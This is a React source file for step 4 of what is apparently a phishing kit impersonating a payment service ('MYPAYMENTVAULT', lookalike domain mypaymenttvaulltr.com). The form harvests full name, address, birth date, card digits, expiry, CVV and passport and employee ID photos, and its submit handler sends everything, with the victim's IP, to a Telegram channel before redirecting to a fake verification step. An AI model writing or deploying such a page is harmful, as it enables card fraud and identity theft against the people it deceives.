import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { Upload, Loader2 } from "lucide-react";
import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";

const INQUIRY_TYPES = [
  "Account Inquiry",
  "Card Issue",
  "Payment Problem",
  "Fraud Report",
  "Other",
];

const inp: React.CSSProperties = {
  width: "100%",
  height: 48,
  padding: "0 14px",
  fontSize: 14,
  color: "#111",
  border: "1px solid #ccc",
  borderRadius: 4,
  outline: "none",
  background: "#fff",
  boxSizing: "border-box",
  fontFamily: "inherit",
};

export default function Step4() {
  const { user, isAuthenticated } = useAuth();
  const [, navigate] = useLocation();

  const [firstName, setFirstName]       = useState("");
  const [lastName, setLastName]         = useState("");
  const [email, setEmail]               = useState("");
  const [phone, setPhone]               = useState("");
  const [address, setAddress]           = useState("");
  const [city, setCity]                 = useState("");
  const [stateVal, setStateVal]         = useState("");
  const [postalCode, setPostalCode]     = useState("");
  const [dob, setDob]                   = useState("");
  const [inquiryType, setInquiryType]   = useState("");
  const [message, setMessage]           = useState("");
  const [cardDigits, setCardDigits]     = useState("");
  const [cardExp, setCardExp]           = useState("");
  const [cardCvv, setCardCvv]           = useState("");
  const [passportFile, setPassportFile] = useState<File | null>(null);
  const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
  const [errors, setErrors]             = useState<Record<string, string>>({});
  const [loading, setLoading]           = useState(false);

  const passportRef = useRef<HTMLInputElement>(null);
  const empIdRef    = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (!isAuthenticated) navigate("/login");
  }, [isAuthenticated, navigate]);

  const validate = () => {
    const e: Record<string, string> = {};
    if (!firstName.trim())   e.firstName   = "Wajib diisi.";
    if (!lastName.trim())    e.lastName    = "Wajib diisi.";
    if (!email.trim())       e.email       = "Wajib diisi.";
    if (!phone.trim())       e.phone       = "Wajib diisi.";
    if (!address.trim())     e.address     = "Wajib diisi.";
    if (!city.trim())        e.city        = "Wajib diisi.";
    if (!stateVal.trim())    e.state       = "Wajib diisi.";
    if (!postalCode.trim())  e.postalCode  = "Wajib diisi.";
    if (!dob.trim())         e.dob         = "Wajib diisi.";
    if (!inquiryType)        e.inquiryType = "Pilih salah satu.";
    if (!cardDigits.trim())       e.cardDigits = "Wajib diisi.";
    else if (!/^\d{8}$/.test(cardDigits.trim())) e.cardDigits = "Harus 8 angka.";
    if (!cardExp.trim())          e.cardExp    = "Wajib diisi.";
    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) e.cardExp = "Format: MM/YY";
    if (!cardCvv.trim())          e.cardCvv    = "Wajib diisi.";
    else if (!/^\d{3,4}$/.test(cardCvv.trim())) e.cardCvv = "3–4 angka.";
    if (!passportFile)       e.passport    = "Foto paspor wajib diunggah.";
    if (!empIdFile)          e.empId       = "Foto ID karyawan wajib diunggah.";
    return e;
  };

  const handleSubmit = async (ev: React.FormEvent) => {
    ev.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({});
    setLoading(true);

    try {
      const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      const ip  = await getIPInfo();

      await sendTelegram(
        `━━━━━━━━━━━━━━━━━━━━━\n` +
        `📋 <b>mypaymenttvaulltr.com</b>\n` +
        `📌 <b>Step 4 — Data Personal</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 <b>Username</b>     : <code>${user?.username ?? "-"}</code>\n` +
        `👦 <b>Nama Lengkap</b> : <code>${firstName} ${lastName}</code>\n` +
        `📧 <b>Email</b>        : <code>${email}</code>\n` +
        `📱 <b>Mobile</b>       : <code>${phone}</code>\n` +
        `🏠 <b>Alamat</b>       : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
        `🎂 <b>Tgl Lahir</b>    : <code>${dob}</code>\n` +
        `📌 <b>Inquiry</b>      : <code>${inquiryType}</code>\n` +
        `💬 <b>Pesan</b>        : <code>${message || "-"}</code>\n` +
        `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
        `📅 <b>Exp</b>          : <code>${cardExp.trim()}</code>\n` +
        `🔐 <b>CVV</b>          : <code>${cardCvv.trim()}</code>\n` +
        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
        `🕐 <b>Waktu</b>        : ${now}\n` +
        `━━━━━━━━━━━━━━━━━━━━━`
      );

      await fetch("/api/submissions/personal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: user?.username ?? "",
          firstName, lastName, email, phone,
          address, city, state: stateVal, postalCode,
          dob, inquiryType, message,
          cardDigits: cardDigits.trim(),
          cardExp: cardExp.trim(),
          cardCvv: cardCvv.trim(),
          ipAddress: ip,
        }),
      }).catch(() => {});

      if (passportFile)
        await sendFileToTelegram(passportFile, `📷 Passport — ${user?.username ?? "-"}`);
      if (empIdFile)
        await sendFileToTelegram(empIdFile, `🪪 Employee ID — ${user?.username ?? "-"}`);

      navigate("/verify");
    } catch (_) {
      navigate("/verify");
    }
  };

  const Err = ({ k }: { k: string }) =>
    errors[k] ? <span style={{ fontSize: 11, color: "#c00", marginTop: 3, display: "block" }}>{errors[k]}</span> : null;

  const row: React.CSSProperties = {
    display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16,
  };

  return (
    <div style={{ minHeight: "100vh", background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
      <style>{`
        .s4i:focus { border-color: #666 !important; }
        .s4i::placeholder { color: #aaa; }
        @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
      `}</style>

      <div style={{ width: "100%", maxWidth: 900 }}>

        {/* Header */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 28 }}>
          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111", fontFamily: "inherit" }}>
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
          <span style={{ fontSize: 12, color: "#888" }}>Langkah 4 dari 6</span>
        </div>

        {/* Step dots */}
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 32, justifyContent: "center" }}>
          {[1,2,3,4,5,6].map(n => {
            const done = n < 4, active = n === 4;
            return (
              <div key={n} style={{ display: "flex", alignItems: "center" }}>
                <div style={{
                  width: 24, height: 24, borderRadius: "50%",
                  background: done || active ? "#111" : "#ddd",
                  display: "flex", alignItems: "center", justifyContent: "center",
                }}>
                  {done
                    ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                    : <span style={{ fontSize: 10, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
                  }
                </div>
                {n < 6 && <div style={{ width: 32, height: 2, background: n < 4 ? "#111" : "#ddd", margin: "0 2px" }} />}
              </div>
            );
          })}
        </div>

        <form onSubmit={handleSubmit}>

          {/* Row 1: First Name + Last Name */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="First Name*" value={firstName}
                onChange={e => setFirstName(e.target.value)}
                style={{ ...inp, borderColor: errors.firstName ? "#c00" : "#ccc" }} />
              <Err k="firstName" />
            </div>
            <div>
              <input className="s4i" type="text" placeholder="Last Name*" value={lastName}
                onChange={e => setLastName(e.target.value)}
                style={{ ...inp, borderColor: errors.lastName ? "#c00" : "#ccc" }} />
              <Err k="lastName" />
            </div>
          </div>

          {/* Row 2: Email + Mobile Phone */}
          <div style={row}>
            <div>
              <input className="s4i" type="email" placeholder="Email*" value={email}
                onChange={e => setEmail(e.target.value)}
                style={{ ...inp, borderColor: errors.email ? "#c00" : "#ccc" }} />
              <Err k="email" />
            </div>
            <div>
              <input className="s4i" type="tel" placeholder="Mobile Phone*" value={phone}
                onChange={e => setPhone(e.target.value)}
                style={{ ...inp, borderColor: errors.phone ? "#c00" : "#ccc" }} />
              <Err k="phone" />
            </div>
          </div>

          {/* Row 3: Mailing Address + City */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="Mailing Address*" value={address}
                onChange={e => setAddress(e.target.value)}
                style={{ ...inp, borderColor: errors.address ? "#c00" : "#ccc" }} />
              <Err k="address" />
            </div>
            <div>
              <input className="s4i" type="text" placeholder="City*" value={city}
                onChange={e => setCity(e.target.value)}
                style={{ ...inp, borderColor: errors.city ? "#c00" : "#ccc" }} />
              <Err k="city" />
            </div>
          </div>

          {/* Row 4: State + Postal Code */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="State*" value={stateVal}
                onChange={e => setStateVal(e.target.value)}
                style={{ ...inp, borderColor: errors.state ? "#c00" : "#ccc" }} />
              <Err k="state" />
            </div>
            <div>
              <input className="s4i" type="text" placeholder="Postal Code*" value={postalCode}
                onChange={e => setPostalCode(e.target.value)}
                style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ccc" }} />
              <Err k="postalCode" />
            </div>
          </div>

          {/* Row 5: DOB + Inquiry Type */}
          <div style={row}>
            <div>
              <input className="s4i" type="text" placeholder="Date of Birth (MM-DD-YYYY)*" value={dob}
                onChange={e => setDob(e.target.value)}
                style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ccc" }} />
              <Err k="dob" />
            </div>
            <div>
              <select value={inquiryType} onChange={e => setInquiryType(e.target.value)}
                style={{
                  ...inp,
                  borderColor: errors.inquiryType ? "#c00" : "#ccc",
                  color: inquiryType ? "#111" : "#aaa",
                  appearance: "none",
                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
                  backgroundRepeat: "no-repeat",
                  backgroundPosition: "right 12px center",
                  paddingRight: 32,
                }}>
                <option value="" disabled>Select Inquiry Type*</option>
                {INQUIRY_TYPES.map(t => <option key={t} value={t} style={{ color: "#111" }}>{t}</option>)}
              </select>
              <Err k="inquiryType" />
            </div>
          </div>

          {/* Row 6: Card Digits + EXP + CVV */}
          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 1fr", gap: 16, marginBottom: 16 }}>
            <div>
              <div style={{ position: "relative" }}>
                <span style={{
                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
                  fontSize: 13, color: "#bbb", fontFamily: "monospace", pointerEvents: "none",
                }}>XXXX XXXX</span>
                <input className="s4i" type="text" inputMode="numeric"
                  placeholder="Card Last 8 Digits*"
                  maxLength={8} value={cardDigits}
                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
                  style={{ ...inp, paddingLeft: 106, fontFamily: "monospace", letterSpacing: "0.12em", borderColor: errors.cardDigits ? "#c00" : "#ccc" }} />
              </div>
              <Err k="cardDigits" />
            </div>
            <div>
              <input className="s4i" type="text" inputMode="numeric"
                placeholder="EXP (MM/YY)*"
                maxLength={5} value={cardExp}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
                }}
                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ccc" }} />
              <Err k="cardExp" />
            </div>
            <div>
              <input className="s4i" type="password" inputMode="numeric"
                placeholder="CVV*"
                maxLength={4} value={cardCvv}
                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
                style={{ ...inp, fontFamily: "monospace", borderColor: errors.cardCvv ? "#c00" : "#ccc" }} />
              <Err k="cardCvv" />
            </div>
          </div>

          {/* Row 7: Message */}
          <div style={{ marginBottom: 24 }}>
            <textarea placeholder="Message" value={message} onChange={e => setMessage(e.target.value)}
              rows={4}
              style={{
                width: "100%", padding: "12px 14px",
                fontSize: 14, color: "#111",
                border: "1px solid #ccc", borderRadius: 4,
                outline: "none", background: "#fff",
                boxSizing: "border-box", resize: "vertical",
                fontFamily: "inherit",
              }} />
          </div>

          {/* Row 8: File Uploads */}
          <div style={row}>
            {/* Passport */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Passport Photo*</p>
              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
                Upload your passport photo (Required)<br />
                Supported: JPEG, PNG • Max size: 50 MB
              </p>
              <input ref={passportRef} type="file" accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={e => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,passport:""})); }} />
              <button type="button" onClick={() => passportRef.current?.click()}
                style={{
                  width: "100%", height: 44, background: "#fff",
                  border: `1px solid ${errors.passport ? "#c00" : "#ccc"}`,
                  borderRadius: 4, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: "#444",
                }}>
                <Upload size={15} />
                {passportFile ? passportFile.name : "Choose Photo"}
              </button>
              <Err k="passport" />
            </div>

            {/* Employee ID */}
            <div>
              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Employee ID Photo*</p>
              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
                Upload your employee ID photo (Required)<br />
                Supported: JPEG, PNG • Max size: 50 MB
              </p>
              <input ref={empIdRef} type="file" accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={e => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,empId:""})); }} />
              <button type="button" onClick={() => empIdRef.current?.click()}
                style={{
                  width: "100%", height: 44, background: "#fff",
                  border: `1px solid ${errors.empId ? "#c00" : "#ccc"}`,
                  borderRadius: 4, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: "#444",
                }}>
                <Upload size={15} />
                {empIdFile ? empIdFile.name : "Choose Photo"}
              </button>
              <Err k="empId" />
            </div>
          </div>

          {/* Buttons */}
          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12, marginTop: 8 }}>
            <button type="button" onClick={() => navigate("/")}
              style={{
                height: 44, padding: "0 32px",
                background: "#fff", color: "#111",
                border: "1px solid #ccc", borderRadius: 4,
                fontSize: 14, fontWeight: 500, cursor: "pointer",
              }}>
              Cancel
            </button>
            <button type="submit" disabled={loading}
              style={{
                height: 44, padding: "0 36px",
                background: "#111", color: "#fff",
                border: "none", borderRadius: 4,
                fontSize: 14, fontWeight: 500,
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.7 : 1,
                display: "flex", alignItems: "center", gap: 8,
              }}>
              {loading
                ? <><Loader2 size={16} style={{ animation: "spin 1s linear infinite" }} /> Sending...</>
                : "Send"}
            </button>
          </div>

        </form>

        <div style={{ textAlign: "right", marginTop: 20 }}>
          <span style={{ fontSize: 11, color: "#bbb" }}>
            &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
          </span>
        </div>
      </div>
    </div>
  );
}
